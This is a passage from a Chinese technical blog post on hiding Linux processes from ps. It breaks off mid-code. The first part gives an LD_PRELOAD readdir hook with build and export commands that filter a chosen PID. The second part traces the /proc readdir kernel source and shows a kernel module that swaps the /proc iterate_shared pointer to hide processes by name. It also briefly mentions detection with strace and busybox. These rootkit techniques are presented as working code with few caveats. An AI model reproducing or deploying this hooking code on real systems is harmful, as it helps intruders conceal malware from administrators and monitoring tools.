简单来说就是：</p><ul><li>库用于打包函数，然后打包的函数就可以被开发的人员直接使用</li><li>linux分为静态库和共享库(动态库)，区别是动态库在加载应用程序时候才被加载</li><li>程序的运行有一个对于动态链接库的操作过程，其中涉及到函数地址的获取</li></ul><p>通过<code>ldd</code>命令可以查看<code>ps</code>程序的工作流程，这是一个帮助查看<code>ELF(可执行文件)</code>对象的工具，能够展示<code>依赖项</code>和<code>共享库</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#ldd /bin/ps</span><br><span class="line"> linux-vdso.so.1 (0x00007ffe1d9e0000)</span><br><span class="line"> libprocps.so.7 =&gt; /usr/lib/libprocps.so.7 (0x00007fb2ae80f000)</span><br><span class="line"> libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007fb2ae64b000)   //GUN C库</span><br><span class="line"> libsystemd.so.0 =&gt; /usr/lib/libsystemd.so.0 (0x00007fb2ae5bf000)</span><br><span class="line"> libdl.so.2 =&gt; /usr/lib/libdl.so.2 (0x00007fb2ae5ba000) //DL API</span><br><span class="line"> /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007fb2aecac000)  //动态链接器</span><br><span class="line"> libpthread.so.0 =&gt; /usr/lib/libpthread.so.0 (0x00007fb2ae599000)</span><br><span class="line"> librt.so.1 =&gt; /usr/lib/librt.so.1 (0x00007fb2ae58f000)</span><br><span class="line"> liblzma.so.5 =&gt; /usr/lib/liblzma.so.5 (0x00007fb2ae367000)</span><br><span class="line"> liblz4.so.1 =&gt; /usr/lib/liblz4.so.1 (0x00007fb2ae348000)</span><br><span class="line"> libgcrypt.so.20 =&gt; /usr/lib/libgcrypt.so.20 (0x00007fb2ae229000)</span><br><span class="line"> libgpg-error.so.0 =&gt; /usr/lib/libgpg-error.so.0 (0x00007fb2ae009000)</span><br></pre></td></tr></table></figure><p>可以看到<code>ps</code>命令使用了上面的这些<code>动态库</code>，而可以通过<code>nm -D /usr/lib/libc.so.6</code>来查看一个C库中提供的函数符号。而程序对于<code>动态库</code>存在一个加载顺序，因此攻击的思路就是在<code>ps</code>加载真正的函数之前就先把函数给替换掉。 Linux提供了一个接口<code>LD_PRELOAD</code>，这是系统的一个<code>环境变量</code>，其配置文件是<code>/etc/ld.so.preload</code>，二者通过<code>动态链接器</code>来实现关联。<code>LD_PRELOAD</code>作用是影响进程运行时的链接，它允许用户自定义在进程运行前优先加载的<code>动态链接库</code>，其目的就是为了有选择性的载入不同<code>动态链接库</code>中的相同函数，而通过此环境变量，攻击者就可以在主进程和<code>动态链接库</code>之间优先插入自己的库，然后将正常的<code>函数库</code>覆盖。 LD_PRELOAD攻击思路：</p><ol><li><code>export LD_PRELOAD=/path/xxx.so</code>设置优先加载的<code>动态链接库</code></li><li>将<code>动态链接库</code>写入配置文档<code>/etc/ld.so.preload</code>中</li><li>修改<code>动态链接器</code>(文件名不一定)</li></ol><p>利用第一种方式，写一个<code>demo</code>然后按照<code>PID</code>隐藏指定的进程。</p><blockquote><p>这儿得看一下<code>ps</code>的具体实现，才能知道去修改哪个函数，<code>which ps</code>然后<code>pacman -Qo /usr/bin/ps</code>(<code>dpkg -S /usr/bin/ps</code>)查看到底属于哪个包，查看包源码即可，但是太麻烦了，<code>ps</code>使用的是<code>readdir</code>函数</p></blockquote><p>因为要重写<code>readdir</code>函数，因此取参以及返回类型要完全相同</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;dirent.h&gt;</span><br><span class="line">struct dirent *readdir(DIR *dirp)&#123;</span><br><span class="line">  //TODO</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还要在代码中定义好<code>DIR类型</code>的结构体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#define __libc_lock_define(CLASS,NAME)</span><br><span class="line">struct __dirstream</span><br><span class="line">   &#123;</span><br><span class="line">    void *__fd;</span><br><span class="line">    char *__data;</span><br><span class="line">    int __entry_data;</span><br><span class="line">    char *__ptr;</span><br><span class="line">    int __entry_ptr;</span><br><span class="line">    size_t __allocation;</span><br><span class="line">    size_t __size;</span><br><span class="line">     __libc_lock_define (, __lock)</span><br><span class="line">   &#125;;</span><br><span class="line">typedef struct __dirstream DIR;</span><br></pre></td></tr></table></figure><p>在程序调用我们<code>假的readdir</code>函数时，函数内部去调用真正的<code>readdir</code>获取到结果，用相同的结构去存储结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">typeof(readdir) *truereaddir;</span><br><span class="line">truereaddir = dlsym(RTLD_NEXT, &quot;readdir&quot;);  //获取到指定动态链接库中的符号地址</span><br><span class="line">struct dirent *content;</span><br><span class="line">content = truereaddir(dirp);</span><br></pre></td></tr></table></figure><p>针对这个<code>content</code>做如下操作：</p><ol><li>判断当前进程是否打开的是<code>/proc</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int dirnamefd(DIR *dirp,char *filter_path)&#123;</span><br><span class="line"></span><br><span class="line">  int fd = dirfd (dirp);</span><br><span class="line">  if(fd == -1)&#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  char path[128]=&#123;0&#125;;</span><br><span class="line">  sprintf (path, &quot;/proc/self/fd/%d&quot;,fd);</span><br><span class="line"></span><br><span class="line">  ssize_t kk = readlink (path, filter_path, sizeof (filter_path));</span><br><span class="line">  if(kk == -1)&#123;</span><br><span class="line">    return 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  filter_path[kk]=0;</span><br><span class="line">  return 1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">strcmp (path_filter,&quot;/proc&quot;)==0</span><br></pre></td></tr></table></figure><ol><li>判断获取到的文件名是否为要过滤的进程<code>PID</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcmp(content-&gt;d_name,PID)==0</span><br></pre></td></tr></table></figure><p>当都满足时，则<code>continue</code>，直接跳过针对这个文件的后续操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. gcc -shared -fPIC -o pidhidden.o newreaddir.c -ldl  //针对进程PID或者是进程名编写链接库</span><br><span class="line">2. export LD_PRELOAD=/home/lang/Desktop/pidhidden.o  //导入环境变量</span><br></pre></td></tr></table></figure><p>此时看一下<code>ps</code>命令的链接库加载顺序</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ldd /usr/bin/bash</span><br><span class="line"> linux-vdso.so.1 (0x00007ffcd03e8000)</span><br><span class="line"> /home/lang/Desktop/pidhidden.o (0x00007f87ab4d5000)   //恶意插入的动态链接库</span><br><span class="line"> libprocps.so.7 =&gt; /usr/lib/libprocps.so.7 (0x00007f87ab27b000)</span><br><span class="line"> libc.so.6 =&gt; /usr/lib/libc.so.6 (0x00007f87ab0b7000)</span><br><span class="line"> libdl.so.2 =&gt; /usr/lib/libdl.so.2 (0x00007f87ab0b2000)</span><br><span class="line"> libsystemd.so.0 =&gt; /usr/lib/libsystemd.so.0 (0x00007f87ab026000)</span><br><span class="line"> /lib64/ld-linux-x86-64.so.2 =&gt; /usr/lib64/ld-linux-x86-64.so.2 (0x00007f87ab71d000)</span><br><span class="line"> libpthread.so.0 =&gt; /usr/lib/libpthread.so.0 (0x00007f87ab005000)</span><br><span class="line"> librt.so.1 =&gt; /usr/lib/librt.so.1 (0x00007f87aaff9000)</span><br><span class="line"> liblzma.so.5 =&gt; /usr/lib/liblzma.so.5 (0x00007f87aadd3000)</span><br><span class="line"> liblz4.so.1 =&gt; /usr/lib/liblz4.so.1 (0x00007f87aadb4000)</span><br><span class="line"> libgcrypt.so.20 =&gt; /usr/lib/libgcrypt.so.20 (0x00007f87aac95000)</span><br><span class="line"> libgpg-error.so.0 =&gt; /usr/lib/libgpg-error.so.0 (0x00007f87aaa75000)</span><br></pre></td></tr></table></figure><p>此刻再执行<code>ps</code>，就看不到我们指定<code>PID</code>的进程了</p><blockquote><p>可以通过<code>unset LD_PRELOAD</code>来去掉这个环境变量，恢复正常的<code>动态链接库</code>顺序</p></blockquote><blockquote><p>strace执行程序，查看<code>access()</code>项加载的配置文件，应急使用<code>busybox</code>查看具体路径，避过执行程序被修改的尴尬</p></blockquote><h3 id="sk13-hook"><a href="#sk13-hook" class="headerlink" title="sk13 hook"></a>sk13 hook</h3><blockquote><p>用户态下的<code>系统调用表</code>hook。</p></blockquote><p>暂时参照<code>hook系统调用</code>，也是走的<code>idt</code>。但是需要<code>/dev/kmem</code>的支持(或许&#x2F;dev&#x2F;mem也行？)，通过替换整个<code>sys_call_table</code>的地址来劫持系统调用。</p><ul><li><a href="https://www.cnblogs.com/allyesno/archive/2007/09/21/900795.html">相关资料</a></li></ul><h2 id="内核级-–-gt-进程隐藏"><a href="#内核级-–-gt-进程隐藏" class="headerlink" title="内核级 –&gt; 进程隐藏"></a>内核级 –&gt; 进程隐藏</h2><blockquote><p>内核级别的隐藏技术大概都和系统调用和VFS离不开关系，无非是修改了原来的系统调用或是劫持了VFS，但是再往深了说，实际上也就是劫持了内核函数。</p></blockquote><p>以ps为例子，<code>strace ps -aux</code>可以看到系统调用流程，获取的信息都来源于<code>/proc</code>这一个<code>伪文件系统</code>中</p><ul><li><code>openat</code>系统函数获取到<code>/proc</code>的文件句柄</li><li><code>getdents64</code>递归获取<code>/proc</code>下所有的文件信息</li><li><code>openat</code>或者<code>open</code>打开<code>/proc/PID/stat</code>，<code>/proc/PID/status</code>和<code>/proc/PID/cmdline</code>获取进程信息</li></ul><h3 id="ring1-劫持VFS"><a href="#ring1-劫持VFS" class="headerlink" title="ring1 劫持VFS"></a><code>ring1</code> 劫持VFS</h3><blockquote><p>可以看到上面<code>ps</code>主要就是针对<code>/proc</code>做了一个遍历，然后输出来，那么如果<code>/proc</code>下本来就没有这个<code>进程文件</code>，是不是就根本查不出来呢。</p></blockquote><p><code>VFS</code>是内核的一个抽象功能，允许不同的文件系统共存，系统中的实体文件不但依赖<code>VFS</code>共存，也依靠其协同工作，详细信息可以查看<a href="https://www.ibm.com/developerworks/cn/linux/l-cn-vfs/index.html">从文件 I&#x2F;O 看 Linux 的虚拟文件系统</a>，而<code>/proc</code>就是<code>VFS</code>的一个具体的实现，内核中的各种信息都在此目录下具象化。 <code>proc</code>文件系统是一个<code>虚拟文件系统</code>的实现，只存在于内存，只是以<code>文件系统</code>的方式提供<code>接口</code>以用来访问内核数据。<code>用户态</code>下可以通过<code>proc</code>来获取到内核的信息，而这些信息是动态改变的，所以只有读取<code>proc</code>文件时，<code>proc</code>文件系统才会动态的从系统内核中读取信息并提交，这些返回的文件并不是都在你的系统中存在的，取决于内核配置和装载的模块。 其下的文件形成如下：</p><ol><li>一部分目录静态形成，比如<code>fs</code>，<code>fb</code>等，这些是在系统初始化时候就挂载到<code>proc</code>目录对应的<code>proc_dir_entry</code>链表下</li><li><code>.</code>和<code>..</code>子目录是当前目录和父目录的链接</li><li>其余目录则是动态生成</li></ol><p>然而针对一个<code>VFS</code>下进程信息的创建却是分类的：</p><ol><li>cat命令之类直接读取进程目录下的节点文件</li><li>ls命令列举所有的进程目录</li></ol><p>针对两种操作<code>VFS</code>其实是两种调用，针对节点信息的采用的是<code>lookup</code>系列函数，而针对目录读取的则是采用<code>readdir</code>，而列举目录也分为<code>列举</code>&#x2F;proc<code>下的目录和列举某个具体进程目录，而不管是哪种方式，最后都会调用</code>proc_pid_instantiate&#96;实例化进程目录</p><p><strong>攻击方式：劫持<code>回调函数</code>，修改返回的信息。</strong></p><blockquote><p>原指针指向函数地址0x1，创建一个新函数0x2，让指针指向0x2，然后再通过新函数去调用0x1地址的函数</p></blockquote><p>以<code>ps</code>读取为例，程序的实现还是列举了<code>/proc</code>的目录，因此还是针对目录的读取：</p><p><code>proc文件系统</code>动态获取信息的接口为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * The root /proc directory is special, as it has the</span><br><span class="line"> * &lt;pid&gt; directories. Thus we don&#x27;t use the generic</span><br><span class="line"> * directory handling functions for that..</span><br><span class="line"> */</span><br><span class="line">static const struct file_operations proc_root_operations = &#123;</span><br><span class="line"> .read = generic_read_dir,</span><br><span class="line"> .iterate_shared = proc_root_readdir,</span><br><span class="line"> .llseek = generic_file_llseek,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而上三种文件目录的实现方式则是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static int proc_root_readdir(struct file *file, struct dir_context *ctx)</span><br><span class="line">&#123;</span><br><span class="line"> if (ctx-&gt;pos &lt; FIRST_PROCESS_ENTRY) &#123;</span><br><span class="line">  int error = proc_readdir(file, ctx); //静态生成的</span><br><span class="line">  if (unlikely(error &lt;= 0))</span><br><span class="line">   return error;</span><br><span class="line">  ctx-&gt;pos = FIRST_PROCESS_ENTRY;</span><br><span class="line"> &#125;</span><br><span class="line"> return proc_pid_readdir(file, ctx);   //动态生成的</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当前系统中的所有进程在进程终止前都会存在于各种链表中，但是只有当进程处于就绪态时会被调度器调度执行，否则永远无法被调度；当进程终止时从链表中清除，从而结束其生命过程；linux中的进程有两个派系组成：内核线程，其根线程是kthreadd线程，进程号是2；用户进程，其根进程是init进程，进程号是1,1号和2号进程是并列的，在系统初始化后期由内核同时创建。而实际的遍历函数是由<code>proc_root_readdir</code>实现的，而它则是一个<code>file_operations</code>的成员<code>iterate_shared</code></p><blockquote><p>linux里面所有的文件操作，底层都要实现一个<code>file_operations</code>，里面的成员是针对该文件的操作集，此处概念参考<a href="https://www.cnblogs.com/embedded-linux/p/5663176.html">linux虚拟文件系统vfs</a>，说的简单一点就是内核用来处理各种请求的函数的地址。这个在&#96;&#96;下有定义。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">struct file_operations &#123;</span><br><span class="line"> struct module *owner;</span><br><span class="line"> loff_t (*llseek) (struct file *, loff_t, int);</span><br><span class="line"> ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);</span><br><span class="line"> ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);</span><br><span class="line"> ssize_t (*read_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line"> ssize_t (*write_iter) (struct kiocb *, struct iov_iter *);</span><br><span class="line"> int (*iterate) (struct file *, struct dir_context *);</span><br><span class="line"> int (*iterate_shared) (struct file *, struct dir_context *);</span><br><span class="line"> __poll_t (*poll) (struct file *, struct poll_table_struct *);</span><br><span class="line"> long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);</span><br><span class="line"> long (*compat_ioctl) (struct file *, unsigned int, unsigned long);</span><br><span class="line"> int (*mmap) (struct file *, struct vm_area_struct *);</span><br><span class="line"> unsigned long mmap_supported_flags;</span><br><span class="line"> int (*open) (struct inode *, struct file *);</span><br><span class="line"> int (*flush) (struct file *, fl_owner_t id);</span><br><span class="line"> int (*release) (struct inode *, struct file *);</span><br><span class="line"> int (*fsync) (struct file *, loff_t, loff_t, int datasync);</span><br><span class="line"> int (*fasync) (int, struct file *, int);</span><br><span class="line"> int (*lock) (struct file *, int, struct file_lock *);</span><br><span class="line"> ssize_t (*sendpage) (struct file *, struct page *, int, size_t, loff_t *, int);</span><br><span class="line"> unsigned long (*get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);</span><br><span class="line"> int (*check_flags)(int);</span><br><span class="line"> int (*flock) (struct file *, int, struct file_lock *);</span><br><span class="line"> ssize_t (*splice_write)(struct pipe_inode_info *, struct file *, loff_t *, size_t, unsigned int);</span><br><span class="line"> ssize_t (*splice_read)(struct file *, loff_t *, struct pipe_inode_info *, size_t, unsigned int);</span><br><span class="line"> int (*setlease)(struct file *, long, struct file_lock **, void **);</span><br><span class="line"> long (*fallocate)(struct file *file, int mode, loff_t offset,</span><br><span class="line">     loff_t len);</span><br><span class="line"> void (*show_fdinfo)(struct seq_file *m, struct file *f);</span><br><span class="line">#ifndef CONFIG_MMU</span><br><span class="line"> unsigned (*mmap_capabilities)(struct file *);</span><br><span class="line">#endif</span><br><span class="line"> ssize_t (*copy_file_range)(struct file *, loff_t, struct file *,</span><br><span class="line">   loff_t, size_t, unsigned int);</span><br><span class="line"> loff_t (*remap_file_range)(struct file *file_in, loff_t pos_in,</span><br><span class="line">       struct file *file_out, loff_t pos_out,</span><br><span class="line">       loff_t len, unsigned int remap_flags);</span><br><span class="line"> int (*fadvise)(struct file *, loff_t, loff_t, int);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>而<code>proc_root_readdir</code>实际上就是<code>iterate_shared</code>指向的函数地址，即<code>file_operations-&gt;iterate_shared</code>，因此实现攻击上只需要把这个指针的指向改了就行。</p><blockquote><p>老版本的内核这个函数传参中包含了一个函数，所以可以通过修改传入的函数修改逻辑，但是新版本的不行了，所以很难受，就得新研究下。</p></blockquote><p>看一下<code>proc_pid_readdir</code>的实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int proc_pid_readdir(struct file *file, struct dir_context *ctx)</span><br><span class="line">&#123;</span><br><span class="line">    //TODO</span><br></pre></td></tr></table></figure><p>我们控制的<code>PID</code>，因此看一下是哪个参数中传进来的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loff_t pos = ctx-&gt;pos</span><br><span class="line">iter.tgid = pos - TGID_OFFSET;</span><br></pre></td></tr></table></figure><p>接着看后面有一个针对<code>pos</code>的判断，其中前置条前条件为<code>#define TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if (pos &gt;= PID_MAX_LIMIT + TGID_OFFSET)</span><br><span class="line"> return 0;</span><br><span class="line"></span><br><span class="line">if (pos == TGID_OFFSET - 2) &#123;</span><br><span class="line"> struct inode *inode = d_inode(ns-&gt;proc_self);</span><br><span class="line"> if (!dir_emit(ctx, &quot;self&quot;, 4, inode-&gt;i_ino, DT_LNK))</span><br><span class="line">  return 0;</span><br><span class="line"> ctx-&gt;pos = pos = pos + 1;</span><br><span class="line">&#125;</span><br><span class="line">if (pos == TGID_OFFSET - 1) &#123;</span><br><span class="line"> struct inode *inode = d_inode(ns-&gt;proc_thread_self);</span><br><span class="line"> if (!dir_emit(ctx, &quot;thread-self&quot;, 11, inode-&gt;i_ino, DT_LNK))</span><br><span class="line">  return 0;</span><br><span class="line"> ctx-&gt;pos = pos = pos + 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来分析下条件：</p><ul><li><code>PID_MAX_LIMIT + TGID_OFFSET</code>标志着目录遍历结束</li><li><code>TGID_OFFSET - 2</code>是<code>init</code>进程，进程号1</li><li><code>TGID_OFFSET - 1</code>是<code>kthread</code>线程，进程号是2</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">static inline bool dir_emit(struct dir_context *ctx,</span><br><span class="line">       const char *name, int namelen,</span><br><span class="line">       u64 ino, unsigned type)</span><br><span class="line">&#123;</span><br><span class="line"> return ctx-&gt;actor(ctx, name, namelen, ctx-&gt;pos, ino, type) == 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果搞了半天还是一个回调函数<code>ctx-&gt;actor</code>，继续追下去最后发现此函数来源于一个函数指针<code>filldir_t</code>，这是<code>filldir</code>函数类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * This is the &quot;filldir&quot; function type, used by readdir() to let</span><br><span class="line"> * the kernel specify what kind of dirent layout it wants to have.</span><br><span class="line"> * This allows the kernel to read directories into kernel space or</span><br><span class="line"> * to have different dirent layouts depending on the binary type.</span><br><span class="line"> */</span><br><span class="line">struct dir_context;</span><br><span class="line">typedef int (*filldir_t)(struct dir_context *, const char *, int, loff_t, u64,</span><br><span class="line">    unsigned);</span><br><span class="line"></span><br><span class="line">struct dir_context &#123;</span><br><span class="line"> filldir_t actor;</span><br><span class="line"> loff_t pos;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>进程在<code>proc</code>目录下展示的是一个个数字组成的目录，通过<code>proc_fill_cache</code>来建立每个目录的层次结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (!proc_fill_cache(file, ctx, name, len,</span><br><span class="line">       proc_pid_instantiate, iter.task, NULL)) &#123;</span><br><span class="line"> put_task_struct(iter.task);</span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而在此之前则会先遍历<code>pid</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for (iter = next_tgid(ns, iter);</span><br><span class="line">     iter.task;</span><br><span class="line">     iter.tgid += 1, iter = next_tgid(ns, iter)) </span><br></pre></td></tr></table></figure><p>而<code>next_tgid</code>中有一个关键函数<code>find_ge_pid</code>，若<code>ns</code>即进程存在，则填写<code>iter.gid</code>和<code>task_struct</code>结构，其中<code>ns</code>的内容是<code>filp-&gt;f_dentry-&gt;d_sb-&gt;s_fs_info</code>也就是<code>pid</code>的命名空间，系统唯一。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pid = find_ge_pid(iter.tgid, ns);</span><br></pre></td></tr></table></figure><p>后进入到单个进程的操作逻辑中，建立单个进程的目录结构</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">char name[PROC_NUMBUF];</span><br><span class="line">int len;</span><br><span class="line">cond_resched();~~</span><br><span class="line">if (!has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))</span><br><span class="line">   continue;</span><br><span class="line">len = snprintf(name, sizeof(name), &quot;%d&quot;, iter.tgid);  //</span><br><span class="line">ctx-&gt;pos = iter.tgid + TGID_OFFSET;</span><br><span class="line">if (!proc_fill_cache(file, ctx, name, len,</span><br><span class="line">         proc_pid_instantiate, iter.task, NULL)) &#123;</span><br><span class="line">put_task_struct(iter.task);</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>proc_fill_cache</code>负责建立一个<code>dentry</code>结构，与父目录形成层次结构，而传参中还有一个<code>proc_pid_instantiate</code>负责建立<code>inode</code>结构，并填写<code>inode_operations</code>和<code>file_operations</code>结构。 <del>代码逻辑卡住，待续。。。</del> 到此利用的方式就十分明显了，因为在循环中可以优先获取到每一个进程结构体<code>task_struct</code>，那么可以通过<code>task_struct</code>中的<code>comm</code>来筛选要过滤的进程，直接跳过当前的循环不进入到<code>proc_fill_cache()</code>函数中，这也就不会在<code>/proc</code>下产生目录结构体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(strcmp(&quot;bash&quot;,iter.task-&gt;comm)==0)&#123;</span><br><span class="line"> printk(&quot;Hidden process is [tgid:%d][pid:%d]:%s\n&quot;,ctx-&gt;pos,iter.task-&gt;pid,iter.task-&gt;comm);</span><br><span class="line"> continue;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>VFS</code>层的劫持主要还是针对的<code>文件操作集</code>，因此首先就得先找到要劫持的操作的<code>函数地址</code>和<code>函数指针</code>，然后替换调<code>函数指针</code>指向的地址。</p><p>对于外界来说，看起来还像是在用<code>proc_root_readdir()</code>函数，但是实际上使用的是可以控制的<code>hack_proc_root_readdir()</code>函数，这点可以通过替换指针很容易做到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int __init hack_kernel(void)&#123;</span><br><span class="line">  printk(&quot;Kernel VFS hacked!!&quot;);</span><br><span class="line">  struct file *getfile;</span><br><span class="line">  struct file_operations *getfile_op;</span><br><span class="line"></span><br><span class="line">  getfile = filp_open(&quot;/proc&quot;,O_RDONLY,0);</span><br><span class="line">  if(IS_ERR(getfile))&#123;</span><br><span class="line">    printk(&quot;open proc error\n&quot;);</span><br><span class="line">    return -1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  origin_proc_root = getfile-&gt;f_op-&gt;iterate_shared;</span><br><span class="line">  getfile_op = getfile-&gt;f_op;</span><br><span class="line">  set_addr_rw();</span><br><span class="line">  getfile_op-&gt;iterate_shared = hack_proc_root_readdir;</span><br><span class="line">  set_addr_ro();</span><br><span class="line"> 